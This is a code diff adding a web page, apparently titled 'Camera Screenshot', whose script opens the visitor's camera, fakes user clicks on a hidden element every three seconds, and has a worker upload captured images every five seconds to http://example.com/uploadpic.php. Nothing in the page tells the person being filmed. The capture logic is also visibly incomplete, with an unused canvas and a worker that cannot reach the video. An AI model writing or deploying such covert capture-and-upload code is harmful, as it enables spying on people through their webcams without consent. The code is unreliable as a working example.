@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Camera Screenshot</title>
+</head>
+<body>
+
+  <script>
+    const video = document.createElement('video');
+    const canvas = document.createElement('canvas');
+    const context = canvas.getContext('2d');
+    const hiddenElement = document.createElement('div'); // For user interaction
+
+    let captureInterval = 5000; // Capture every 5 seconds
+
+    hiddenElement.style.display = 'none';
+    document.body.appendChild(hiddenElement);
+
+    // Start worker thread
+    const worker = new Worker('capture.js'); 
+    worker.onmessage = function(event) {
+      // Receive screenshot data from worker and upload it
+      const imageData = event.data; 
+      fetch('http://example.com/uploadpic.php', {
+        method: 'POST',
+        body: JSON.stringify({ image: imageData })
+      })
+        .then(response => {
+          console.log('Image uploaded successfully!');
+        })
+        .catch(error => {
+          console.error('Error uploading image:', error);
+        });
+    };
+
+    // Get user's media stream (video only)
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        video.play();
+      })
+      .catch(err => {
+        console.error('Error accessing camera:', err);
+      });
+
+    // Simulate user interaction every 3 seconds
+    setInterval(() => {
+      hiddenElement.click(); 
+    }, 3000);
+
+    // Trigger screenshot capture in the worker
+    setInterval(() => {
+      worker.postMessage(); 
+    }, captureInterval);
+
+  </script>
+
+</body>
+</html>
